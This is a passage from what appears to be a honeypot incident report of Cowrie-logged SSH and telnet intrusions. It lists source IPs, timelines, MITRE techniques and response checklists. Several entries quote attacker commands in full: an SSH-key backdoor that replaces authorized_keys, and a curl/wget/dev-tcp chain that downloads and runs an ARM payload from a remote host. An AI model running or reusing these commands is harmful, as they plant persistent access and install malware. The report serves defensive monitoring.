| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-01 11:57:55` | `cowrie.session.connect` |
| `2026-07-01 11:57:55` | `cowrie.client.version` |
| `2026-07-01 11:57:55` | `cowrie.client.kex` |
| `2026-07-01 11:57:57` | `cowrie.login.success` |
| `2026-07-01 11:58:07` | `cowrie.session.params` |
| `2026-07-01 11:58:07` | `cowrie.command.input` |
| `2026-07-01 11:58:07` | `cowrie.command.failed` |
| `2026-07-01 11:58:10` | `cowrie.log.closed` |
| `2026-07-01 11:58:36` | `cowrie.session.params` |
| `2026-07-01 11:58:36` | `cowrie.command.input` |
| `2026-07-01 11:58:37` | `cowrie.session.file_download` |
| `2026-07-01 11:58:37` | `cowrie.log.closed` |
| `2026-07-01 11:58:50` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `185.174.69[.]65` to AbuseIPDB if not already reported
- [ ] Block `185.174.69[.]65` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-aaf16ca0f67a

| Field | Detail |
|---|---|
| **Source IP** | `185.174.69[.]65` |
| **First Seen** | 2026-07-01 11:58 |
| **Last Seen** | 2026-07-01 11:58 |
| **Session Duration** | 9s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-01 11:58:37` | `cowrie.session.connect` |
| `2026-07-01 11:58:40` | `cowrie.client.version` |
| `2026-07-01 11:58:43` | `cowrie.client.kex` |
| `2026-07-01 11:58:46` | `cowrie.login.success` |
| `2026-07-01 11:58:46` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `185.174.69[.]65` to AbuseIPDB if not already reported
- [ ] Block `185.174.69[.]65` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-42fc5b3128ef

| Field | Detail |
|---|---|
| **Source IP** | `185.174.69[.]65` |
| **First Seen** | 2026-07-01 11:58 |
| **Last Seen** | 2026-07-01 11:58 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-01 11:58:47` | `cowrie.session.connect` |
| `2026-07-01 11:58:47` | `cowrie.client.version` |
| `2026-07-01 11:58:48` | `cowrie.client.kex` |
| `2026-07-01 11:58:50` | `cowrie.login.success` |
| `2026-07-01 11:58:50` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `185.174.69[.]65` to AbuseIPDB if not already reported
- [ ] Block `185.174.69[.]65` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-962b302bcd8e

| Field | Detail |
|---|---|
| **Source IP** | `129.153.145[.]135` |
| **First Seen** | 2026-07-01 11:59 |
| **Last Seen** | 2026-07-01 11:59 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-01 11:59:53` | `cowrie.session.connect` |
| `2026-07-01 11:59:53` | `cowrie.client.version` |
| `2026-07-01 11:59:53` | `cowrie.client.kex` |
| `2026-07-01 11:59:53` | `cowrie.login.success` |
| `2026-07-01 11:59:53` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `129.153.145[.]135` to AbuseIPDB if not already reported
- [ ] Block `129.153.145[.]135` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-c537e054a757

| Field | Detail |
|---|---|
| **Source IP** | `129.153.145[.]135` |
| **First Seen** | 2026-07-01 11:59 |
| **Last Seen** | 2026-07-01 11:59 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-01 11:59:53` | `cowrie.session.connect` |
| `2026-07-01 11:59:53` | `cowrie.client.version` |
| `2026-07-01 11:59:53` | `cowrie.client.kex` |
| `2026-07-01 11:59:53` | `cowrie.login.success` |
| `2026-07-01 11:59:53` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `129.153.145[.]135` to AbuseIPDB if not already reported
- [ ] Block `129.153.145[.]135` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-32e7a604c89e

| Field | Detail |
|---|---|
| **Source IP** | `129.153.145[.]135` |
| **First Seen** | 2026-07-01 11:59 |
| **Last Seen** | 2026-07-01 11:59 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-01 11:59:57` | `cowrie.session.connect` |
| `2026-07-01 11:59:57` | `cowrie.client.version` |
| `2026-07-01 11:59:57` | `cowrie.client.kex` |
| `2026-07-01 11:59:57` | `cowrie.login.success` |
| `2026-07-01 11:59:57` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `129.153.145[.]135` to AbuseIPDB if not already reported
- [ ] Block `129.153.145[.]135` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-ede72b9b5ed7

| Field | Detail |
|---|---|
| **Source IP** | `185.242.3[.]195` |
| **First Seen** | 2026-07-01 12:01 |
| **Last Seen** | 2026-07-01 12:01 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `echo OK` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-01 12:01:00` | `cowrie.session.connect` |
| `2026-07-01 12:01:00` | `cowrie.client.version` |
| `2026-07-01 12:01:00` | `cowrie.client.kex` |
| `2026-07-01 12:01:01` | `cowrie.login.success` |
| `2026-07-01 12:01:01` | `cowrie.session.params` |
| `2026-07-01 12:01:01` | `cowrie.command.input` |
| `2026-07-01 12:01:01` | `cowrie.log.closed` |
| `2026-07-01 12:01:01` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `185.242.3[.]195` to AbuseIPDB if not already reported
- [ ] Block `185.242.3[.]195` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-5ff5f7516cba

| Field | Detail |
|---|---|
| **Source IP** | `61.151.249[.]194` |
| **First Seen** | 2026-07-01 12:01 |
| **Last Seen** | 2026-07-01 12:06 |
| **Session Duration** | 301s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-01 12:01:53` | `cowrie.session.connect` |
| `2026-07-01 12:01:53` | `cowrie.client.version` |
| `2026-07-01 12:01:53` | `cowrie.client.kex` |
| `2026-07-01 12:01:54` | `cowrie.login.success` |
| `2026-07-01 12:01:55` | `cowrie.session.params` |
| `2026-07-01 12:01:55` | `cowrie.command.input` |
| `2026-07-01 12:01:55` | `cowrie.command.failed` |
| `2026-07-01 12:01:56` | `cowrie.log.closed` |
| `2026-07-01 12:01:57` | `cowrie.session.params` |
| `2026-07-01 12:01:57` | `cowrie.command.input` |
| `2026-07-01 12:01:57` | `cowrie.session.file_download` |
| `2026-07-01 12:01:57` | `cowrie.log.closed` |
| `2026-07-01 12:06:54` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `61.151.249[.]194` to AbuseIPDB if not already reported
- [ ] Block `61.151.249[.]194` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-f49b2ee72fb7

| Field | Detail |
|---|---|
| **Source IP** | `111.228.13[.]226` |
| **First Seen** | 2026-07-01 12:03 |
| **Last Seen** | 2026-07-01 12:04 |
| **Session Duration** | 12s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-01 12:03:56` | `cowrie.session.connect` |
| `2026-07-01 12:03:56` | `cowrie.client.version` |
| `2026-07-01 12:03:57` | `cowrie.client.kex` |
| `2026-07-01 12:03:59` | `cowrie.login.success` |
| `2026-07-01 12:04:00` | `cowrie.session.params` |
| `2026-07-01 12:04:00` | `cowrie.command.input` |
| `2026-07-01 12:04:00` | `cowrie.command.failed` |
| `2026-07-01 12:04:01` | `cowrie.log.closed` |
| `2026-07-01 12:04:02` | `cowrie.session.params` |
| `2026-07-01 12:04:02` | `cowrie.command.input` |
| `2026-07-01 12:04:02` | `cowrie.session.file_download` |
| `2026-07-01 12:04:02` | `cowrie.log.closed` |
| `2026-07-01 12:04:08` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `111.228.13[.]226` to AbuseIPDB if not already reported
- [ ] Block `111.228.13[.]226` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-4ec1831468fc

| Field | Detail |
|---|---|
| **Source IP** | `111.228.13[.]226` |
| **First Seen** | 2026-07-01 12:04 |
| **Last Seen** | 2026-07-01 12:04 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-01 12:04:02` | `cowrie.session.connect` |
| `2026-07-01 12:04:02` | `cowrie.client.version` |
| `2026-07-01 12:04:03` | `cowrie.client.kex` |
| `2026-07-01 12:04:05` | `cowrie.login.success` |
| `2026-07-01 12:04:06` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `111.228.13[.]226` to AbuseIPDB if not already reported
- [ ] Block `111.228.13[.]226` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-f95646b1b1c7

| Field | Detail |
|---|---|
| **Source IP** | `111.228.13[.]226` |
| **First Seen** | 2026-07-01 12:04 |
| **Last Seen** | 2026-07-01 12:04 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-01 12:04:06` | `cowrie.session.connect` |
| `2026-07-01 12:04:06` | `cowrie.client.version` |
| `2026-07-01 12:04:06` | `cowrie.client.kex` |
| `2026-07-01 12:04:08` | `cowrie.login.success` |
| `2026-07-01 12:04:08` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `111.228.13[.]226` to AbuseIPDB if not already reported
- [ ] Block `111.228.13[.]226` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-2fa87810f07f

| Field | Detail |
|---|---|
| **Source IP** | `125.31.2[.]160` |
| **First Seen** | 2026-07-01 12:04 |
| **Last Seen** | 2026-07-01 12:04 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-01 12:04:37` | `cowrie.session.connect` |
| `2026-07-01 12:04:37` | `cowrie.client.version` |
| `2026-07-01 12:04:37` | `cowrie.client.kex` |
| `2026-07-01 12:04:38` | `cowrie.login.success` |
| `2026-07-01 12:04:39` | `cowrie.session.params` |
| `2026-07-01 12:04:39` | `cowrie.command.input` |
| `2026-07-01 12:04:39` | `cowrie.command.failed` |
| `2026-07-01 12:04:39` | `cowrie.log.closed` |
| `2026-07-01 12:04:40` | `cowrie.session.params` |
| `2026-07-01 12:04:40` | `cowrie.command.input` |
| `2026-07-01 12:04:40` | `cowrie.session.file_download` |
| `2026-07-01 12:04:40` | `cowrie.log.closed` |
| `2026-07-01 12:04:44` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `125.31.2[.]160` to AbuseIPDB if not already reported
- [ ] Block `125.31.2[.]160` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-d2326c0710de

| Field | Detail |
|---|---|
| **Source IP** | `125.31.2[.]160` |
| **First Seen** | 2026-07-01 12:04 |
| **Last Seen** | 2026-07-01 12:04 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-01 12:04:41` | `cowrie.session.connect` |
| `2026-07-01 12:04:41` | `cowrie.client.version` |
| `2026-07-01 12:04:41` | `cowrie.client.kex` |
| `2026-07-01 12:04:42` | `cowrie.login.success` |
| `2026-07-01 12:04:42` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `125.31.2[.]160` to AbuseIPDB if not already reported
- [ ] Block `125.31.2[.]160` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-36f0419038d8

| Field | Detail |
|---|---|
| **Source IP** | `125.31.2[.]160` |
| **First Seen** | 2026-07-01 12:04 |
| **Last Seen** | 2026-07-01 12:04 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-01 12:04:42` | `cowrie.session.connect` |
| `2026-07-01 12:04:42` | `cowrie.client.version` |
| `2026-07-01 12:04:43` | `cowrie.client.kex` |
| `2026-07-01 12:04:43` | `cowrie.login.success` |
| `2026-07-01 12:04:44` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `125.31.2[.]160` to AbuseIPDB if not already reported
- [ ] Block `125.31.2[.]160` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-3bdcdd046d53

| Field | Detail |
|---|---|
| **Source IP** | `45.198.224[.]120` |
| **First Seen** | 2026-07-01 12:07 |
| **Last Seen** | 2026-07-01 12:08 |
| **Session Duration** | 12s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `echo OK` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-01 12:07:59` | `cowrie.session.connect` |
| `2026-07-01 12:08:01` | `cowrie.client.version` |
| `2026-07-01 12:08:01` | `cowrie.client.kex` |
| `2026-07-01 12:08:06` | `cowrie.login.success` |
| `2026-07-01 12:08:10` | `cowrie.session.params` |
| `2026-07-01 12:08:10` | `cowrie.command.input` |
| `2026-07-01 12:08:12` | `cowrie.log.closed` |
| `2026-07-01 12:08:12` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.198.224[.]120` to AbuseIPDB if not already reported
- [ ] Block `45.198.224[.]120` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-d47fb96f9106

| Field | Detail |
|---|---|
| **Source IP** | `45.205.1[.]42` |
| **First Seen** | 2026-07-01 12:08 |
| **Last Seen** | 2026-07-01 12:08 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `echo OK` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-01 12:08:54` | `cowrie.session.connect` |
| `2026-07-01 12:08:54` | `cowrie.client.version` |
| `2026-07-01 12:08:54` | `cowrie.client.kex` |
| `2026-07-01 12:08:56` | `cowrie.login.success` |
| `2026-07-01 12:08:58` | `cowrie.session.params` |
| `2026-07-01 12:08:58` | `cowrie.command.input` |
| `2026-07-01 12:08:58` | `cowrie.log.closed` |
| `2026-07-01 12:08:58` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.205.1[.]42` to AbuseIPDB if not already reported
- [ ] Block `45.205.1[.]42` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-ebf53219391c

| Field | Detail |
|---|---|
| **Source IP** | `45.198.224[.]120` |
| **First Seen** | 2026-07-01 12:19 |
| **Last Seen** | 2026-07-01 12:19 |
| **Session Duration** | 12s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `echo OK` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-01 12:19:24` | `cowrie.session.connect` |
| `2026-07-01 12:19:26` | `cowrie.client.version` |
| `2026-07-01 12:19:26` | `cowrie.client.kex` |
| `2026-07-01 12:19:31` | `cowrie.login.success` |
| `2026-07-01 12:19:35` | `cowrie.session.params` |
| `2026-07-01 12:19:35` | `cowrie.command.input` |
| `2026-07-01 12:19:37` | `cowrie.log.closed` |
| `2026-07-01 12:19:37` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.198.224[.]120` to AbuseIPDB if not already reported
- [ ] Block `45.198.224[.]120` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-6d9392715dce

| Field | Detail |
|---|---|
| **Source IP** | `45.205.1[.]42` |
| **First Seen** | 2026-07-01 12:25 |
| **Last Seen** | 2026-07-01 12:25 |
| **Session Duration** | 5s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `echo OK` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-01 12:25:46` | `cowrie.session.connect` |
| `2026-07-01 12:25:46` | `cowrie.client.version` |
| `2026-07-01 12:25:47` | `cowrie.client.kex` |
| `2026-07-01 12:25:48` | `cowrie.login.success` |
| `2026-07-01 12:25:50` | `cowrie.session.params` |
| `2026-07-01 12:25:50` | `cowrie.command.input` |
| `2026-07-01 12:25:51` | `cowrie.log.closed` |
| `2026-07-01 12:25:51` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.205.1[.]42` to AbuseIPDB if not already reported
- [ ] Block `45.205.1[.]42` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-0149f49c7f44

| Field | Detail |
|---|---|
| **Source IP** | `45.198.224[.]120` |
| **First Seen** | 2026-07-01 12:30 |
| **Last Seen** | 2026-07-01 12:31 |
| **Session Duration** | 13s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `echo OK` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-01 12:30:55` | `cowrie.session.connect` |
| `2026-07-01 12:30:56` | `cowrie.client.version` |
| `2026-07-01 12:30:56` | `cowrie.client.kex` |
| `2026-07-01 12:31:03` | `cowrie.login.success` |
| `2026-07-01 12:31:06` | `cowrie.session.params` |
| `2026-07-01 12:31:06` | `cowrie.command.input` |
| `2026-07-01 12:31:09` | `cowrie.log.closed` |
| `2026-07-01 12:31:09` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.198.224[.]120` to AbuseIPDB if not already reported
- [ ] Block `45.198.224[.]120` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-4d1a91160338

| Field | Detail |
|---|---|
| **Source IP** | `118.145.245[.]82` |
| **First Seen** | 2026-07-01 12:31 |
| **Last Seen** | 2026-07-01 12:32 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-01 12:31:55` | `cowrie.session.connect` |
| `2026-07-01 12:31:56` | `cowrie.telnet.option` |
| `2026-07-01 12:31:57` | `cowrie.telnet.option` |
| `2026-07-01 12:32:57` | `cowrie.login.success` |
| `2026-07-01 12:32:57` | `cowrie.session.params` |

**Recommended Actions:**
- [ ] Submit `118.145.245[.]82` to AbuseIPDB if not already reported
- [ ] Block `118.145.245[.]82` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-fad9a0b20968

| Field | Detail |
|---|---|
| **Source IP** | `118.31.229[.]191` |
| **First Seen** | 2026-07-01 12:33 |
| **Last Seen** | 2026-07-01 12:33 |
| **Session Duration** | 8s |
| **Login Attempts** | 2 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `echo 1 > /dev/null && cat /bin/echo, nohup $SHELL -c "curl hxxp://60.170.253[.]77:60105/arm_linux -o /tmp/wquivFzX5z; if [ ! -f /tmp/wquivFzX5z ]; then wget hxxp://60.170.253[.]77:60105/arm_linux -O /tmp/wquivFzX5z; fi; if [ ! -f /tmp/wquivFzX5z ]; then exec 6<>/dev/tcp/60.170.253[.]77/60105 && echo -n 'GET /arm_linux' >&6 && cat 0<&6 > /tmp/wquivFzX5z ; chmod +x /tmp/wquivFzX5z && /tmp/wquivFzX5z zcQC1XXTdlCYbZnANNyaY4Recd101wXKt7TKAdZrz3JQjGyQ3zDbgGyGSXDKdckB0bOu0wTdc81wV4N6kdwxwJRrmFNx03TWAd64stcCx3bEb16BdJLaNsCSaIFdeMt01BPVsbjKANZrz3NemGuZ3zrZl2, head -c 2545100 > /tmp/271kDJnfLZ, nohup $SHELL -c "curl hxxp://60.170.253[.]77:60105/arm_linux -o /tmp/wquivFzX5z; if [ ! -f /tmp/wquivFzX5z ]; then wget hxxp://60.170.253[.]77:60105/arm_linux -O /tmp/wquivFzX5z; fi; if [ ! -f /tmp/wquivFzX5z ]; then exec 6<>/dev/tcp/60.170.253[.]77/60105 && echo -n 'GET /arm_linux' >&6 && cat 0<&6 > /tmp/wquivFzX5z ; chmod +x /tmp/wquivFzX5z && /tmp/wquivFzX5z zcQC1XXTdlCYbZnANNyaY4Recd101wXKt7TKAdZrz3JQjGyQ3zDbgGyGSXDKdckB0bOu0wTdc81wV4N6kdwxwJRrmFNx03TWAd64stcCx3bEb16BdJLaNsCSaIFdeMt01BPVsbjKANZrz3NemGuZ3zrZl2, (WELF` |
| **TTPs (MITRE)** | T1078 · T1083 · T1105 · T1110.001 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-01 12:33:30` | `cowrie.session.connect` |
| `2026-07-01 12:33:30` | `cowrie.client.version` |
| `2026-07-01 12:33:31` | `cowrie.client.kex` |
| `2026-07-01 12:33:33` | `cowrie.login.failed` |
| `2026-07-01 12:33:34` | `cowrie.login.success` |
| `2026-07-01 12:33:35` | `cowrie.session.params` |
| `2026-07-01 12:33:35` | `cowrie.command.input` |
| `2026-07-01 12:33:39` | `cowrie.command.input` |
| `2026-07-01 12:33:39` | `cowrie.command.input` |
| `2026-07-01 12:33:39` | `cowrie.command.input` |
| `2026-07-01 12:33:39` | `cowrie.command.input` |
| `2026-07-01 12:33:39` | `cowrie.log.closed` |
| `2026-07-01 12:33:39` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `118.31.229[.]191` to AbuseIPDB if not already reported
- [ ] Block `118.31.229[.]191` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-71717e08a577

| Field | Detail |
|---|---|
| **Source IP** | `118.31.229[.]191` |
| **First Seen** | 2026-07-01 12:33 |
| **Last Seen** | 2026-07-01 12:33 |
| **Session Duration** | 8s |
| **Login Attempts** | 2 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `echo 1 > /dev/null && cat /bin/echo, nohup $SHELL -c "curl hxxp://60.170.253[.]77:60105/arm_linux -o /tmp/92uve7yKbu; if [ ! -f /tmp/92uve7yKbu ]; then wget hxxp://60.170.253[.]77:60105/arm_linux -O /tmp/92uve7yKbu; fi; if [ ! -f /tmp/92uve7yKbu ]; then exec 6<>/dev/tcp/60.170.253[.]77/60105 && echo -n 'GET /arm_linux' >&6 && cat 0<&6 > /tmp/92uve7yKbu ; chmod +x /tmp/92uve7yKbu && /tmp/92uve7yKbu zcQC1XXTdlCYbZnANNyaY4Recd101wXKt7TKAdZrz3JQjGyQ3zDbgGyGSXDKdckB0bOu0wTdc81wV4N6kdwxwJRrmFNx03TWAd64stcCx3bEb16BdJLaNsCSaIFdeMt01BPVsbjKANZrz3NemGuZ3zrZl2, head -c 2545100 > /tmp/l0tTTEa2UD, nohup $SHELL -c "curl hxxp://60.170.253[.]77:60105/arm_linux -o /tmp/92uve7yKbu; if [ ! -f /tmp/92uve7yKbu ]; then wget hxxp://60.170.253[.]77:60105/arm_linux -O /tmp/92uve7yKbu; fi; if [ ! -f /tmp/92uve7yKbu ]; then exec 6<>/dev/tcp/60.170.253[.]77/60105 && echo -n 'GET /arm_linux' 